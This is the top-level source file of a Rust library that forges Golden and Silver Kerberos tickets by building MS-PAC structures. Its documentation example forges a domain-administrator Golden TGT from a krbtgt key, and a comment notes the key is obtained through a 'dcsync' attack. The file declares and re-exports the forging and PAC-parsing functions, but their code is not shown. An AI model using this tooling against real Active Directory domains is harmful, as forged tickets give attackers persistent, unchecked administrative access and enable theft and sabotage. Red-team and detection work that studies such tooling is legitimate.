//! **ms-pac-forge** — MS-PAC marshaling + Golden/Silver Kerberos ticket
//! forgery in pure Rust. Extracted from adhammer.
//!
//! # Modules
//! - [`pac`] — PAC container parse + build (KERB_VALIDATION_INFO,
//!   CLIENT_INFO, ATTRIBUTES, REQUESTOR, SERVER/KDC signatures).
//! - [`forge`] — [`forge::forge_golden_tgt`] and [`forge::forge_silver_tgt`].
//! - [`checksum`] — RC4-HMAC (etype 23) + KERB_CHECKSUM_HMAC_MD5 (-138) used
//!   by RC4 forges. AES256 is provided by picky-krb.
//!
//! # Example
//! ```no_run
//! use ms_pac_forge::pac::ForgeIdentity;
//! use ms_pac_forge::forge::forge_golden_tgt;
//!
//! let id = ForgeIdentity {
//!     user: "Administrator".into(),
//!     rid: 500,
//!     primary_gid: 513,
//!     group_rids: vec![513, 512, 520, 518, 519],
//!     domain_subauths: vec![21, 1111111111, 2222222222, 3333333333],
//!     logon_server: "DC01".into(),
//!     logon_domain: "CORP".into(),
//! };
//! let krbtgt_aes256 = [0x42u8; 32]; // from `dcsync krbtgt`
//! let tgt = forge_golden_tgt(&id, "CORP.LOCAL", &krbtgt_aes256, false).unwrap();
//! let _ = tgt.ticket_cipher();
//! ```

pub mod checksum;
pub mod forge;
pub mod pac;
pub mod util;

pub use forge::{forge_golden_tgt, forge_silver_tgt, ForgedTicket};
pub use pac::{
    assemble_pac, build_kerb_validation_info, decrypt_ticket_pac_aes256, decrypt_ticket_pac_rc4,
    parse_pac, ForgeIdentity, PacBuf, ParsedPac,
};
